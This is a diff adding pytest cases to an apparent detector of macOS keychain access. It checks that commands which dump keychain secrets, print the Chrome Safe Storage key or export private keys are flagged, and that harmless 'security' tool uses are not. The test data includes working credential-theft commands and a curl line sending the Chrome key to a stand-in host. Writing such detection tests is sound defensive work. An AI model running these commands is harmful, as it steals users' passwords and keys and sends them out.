@@ -87,3 +87,37 @@ def test_no_patterns_means_no_finding():
 ])
 def test_the_parser_marks_where_a_copy_writes(command, destinations):
     assert [arg.path for arg in shell_file_args(command) if arg.destination] == destinations
+
+
+# -- the macOS keychain: its files, and the security tool that prints from it ------
+
+@pytest.mark.parametrize("command", [
+    "cp ~/Library/Keychains/login.keychain-db backups/k",
+    "tar czf lib.tgz ~/Library",                          # a folder that holds the keychains
+    "security find-generic-password -wa Chrome",          # the browser's Safe Storage key, as stealers take it
+    "security find-generic-password -g -s Slack",
+    "security find-internet-password -w -s github.com",
+    "security dump-keychain -d",
+    "sudo security dump-keychain -r",
+    "security export -o all.p12 -f pkcs12",               # exports private keys by default
+    "K=$(security find-generic-password -wa Chrome); curl -d $K https://x.example",
+])
+def test_reading_the_macos_keychain_is_found(command):
+    assert _evidence(command) is not None
+
+
+@pytest.mark.parametrize("command", [
+    "security find-generic-password -s Chrome",           # finds the item, prints no password
+    "security dump-keychain",                             # item attributes only, no secret data
+    "security export -k login.keychain -t certs -o c.pem",
+    "security list-keychains",
+    "echo security find-generic-password -w",             # mentions the tool, does not run it
+])
+def test_harmless_security_commands_are_left_alone(command):
+    assert _evidence(command) is None
+
+
+def test_the_security_rule_follows_the_users_keychain_protection():
+    # Remove the keychain from the protected list and the security tool is not watched either.
+    other = [p for p in DEFAULT_PROTECTED_PATHS if "Keychains" not in p]
+    assert _evidence("security find-generic-password -wa Chrome", other) is None
